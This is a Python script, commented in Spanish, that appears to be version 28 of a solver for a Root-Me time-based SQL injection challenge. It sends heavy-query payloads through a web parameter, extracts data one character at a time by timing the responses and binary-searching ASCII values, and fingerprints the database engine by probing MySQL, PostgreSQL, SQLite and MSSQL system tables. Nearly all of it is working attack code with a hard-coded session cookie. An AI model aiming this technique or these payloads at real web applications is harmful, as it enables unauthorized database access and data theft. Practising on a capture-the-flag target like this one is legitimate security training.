#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 28 - IDENTIFICAR MOTOR DE DB
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=3):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=2)
        return t > self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  IDENTIFICANDO EL MOTOR DE BASE DE DATOS")
print("="*70)

# 1. Probar MySQL
print("\n[1] Probando MySQL:")
mysql_tests = [
    ("VERSION()", "SELECT VERSION()"),
    ("DATABASE()", "SELECT DATABASE()"),
    ("USER()", "SELECT USER()"),
    ("information_schema", "EXISTS(SELECT * FROM information_schema.tables)")
]

for nombre, query in mysql_tests:
    if injector.is_true(query):
        print(f"  ✅ {nombre} disponible")
    else:
        print(f"  ❌ {nombre} no disponible")

# 2. Probar PostgreSQL
print("\n[2] Probando PostgreSQL:")
pg_tests = [
    ("version()", "EXISTS(SELECT * FROM pg_catalog.pg_tables)"),
    ("current_database()", "EXISTS(SELECT * FROM pg_catalog.pg_database)"),
    ("current_user", "EXISTS(SELECT * FROM pg_catalog.pg_user)")
]

for nombre, query in pg_tests:
    if injector.is_true(query):
        print(f"  ✅ {nombre} disponible")
    else:
        print(f"  ❌ {nombre} no disponible")

# 3. Probar SQLite
print("\n[3] Probando SQLite:")
if injector.is_true("EXISTS(SELECT * FROM sqlite_master)"):
    print("  ✅ sqlite_master disponible (SQLite)")
else:
    print("  ❌ sqlite_master no disponible (no es SQLite)")

# 4. Probar MSSQL
print("\n[4] Probando MSSQL:")
if injector.is_true("EXISTS(SELECT * FROM sysobjects)"):
    print("  ✅ sysobjects disponible (MSSQL)")
else:
    print("  ❌ sysobjects no disponible (no es MSSQL)")
